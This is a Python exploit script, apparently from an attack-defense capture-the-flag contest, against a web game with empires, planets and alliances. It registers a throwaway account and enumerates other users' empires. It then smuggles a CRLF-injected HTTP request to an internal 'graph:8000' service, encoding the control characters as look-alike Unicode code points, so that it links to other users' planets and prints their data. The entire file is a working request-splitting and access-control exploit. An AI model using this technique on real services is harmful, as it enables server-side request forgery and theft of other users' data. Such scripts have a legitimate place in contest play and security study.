#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, json
import ast

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = 'farm' + ':9613'
url = 'http://{}'.format(ip)


s = requests.Session()

#s.post(url + '', timeout=(None,None))
username = generator()
auth = {
"username": username,
"password": username
}

s.post(url + '/api/register', json=auth, timeout=(None,None))
jsonResponse = s.post(url + '/api/login', json=auth, timeout=(None,None)).text


empire = generator()

data = {
"name": empire
}

jsonResponse = s.post(url + '/api/empire/create', json=data, timeout=(None,None)).text
empire_id = json.loads(jsonResponse)["ok"]

#print(jsonResponse)

planet_id = json.loads(jsonResponse)["ok"]


jsonResponse = s.get(url + '/api/me', timeout=(None,None)).text

user_id = json.loads(jsonResponse)["ok"]["id"]


for i in range(1,30):
    jsonResponse = s.get(url + '/api/user/{}/empires'.format(i), timeout=(None, None)).text

    user_empires = json.loads(jsonResponse)["ok"]

    for user_empire in user_empires:
        empiers = s.get(url + '/api/empire/{}'.format(user_empire), timeout=(None, None)).json()

        planet_name = generator()
        info = generator()

        plannet_data = {
            "graph": empire_id,
            "name": planet_name,
            "info": info
        }

        jsonResponse = s.post(url + '/api/planet/create', json=plannet_data, timeout=(None, None)).json()

        planet_id = jsonResponse["ok"]

        for pl in empiers["ok"]["nodes"]:
            jsonResponse = s.post(url + '/api/alliance/create', json={"l": planet_id, "r": pl},
                                  timeout=(None, None)).json()

        for pl in empiers["ok"]["nodes"]:

            payload = ""
            payload += "1337 HTTP/1.1\r\nHost: graph:8000\r\n\r\n"
            payload += f"GET /api/link/{pl}/{planet_id}"

            dct = {
                ' ': '\u0120',
                ':': '\u013a',
                '\r': '\u010d',
                '\n': '\u010a',
                '/': '\u012f',
            }

            for i in dct:
                payload = payload.replace(i, dct[i])

            jsonResponse = s.post(url + '/api/alliance/create', json={"l": planet_id, "r": payload},
                                  timeout=(None, None)).json()

            jsonResponse = s.get(url + '/api/planet/' + str(pl), timeout=(None, None)).text
            print(jsonResponse)







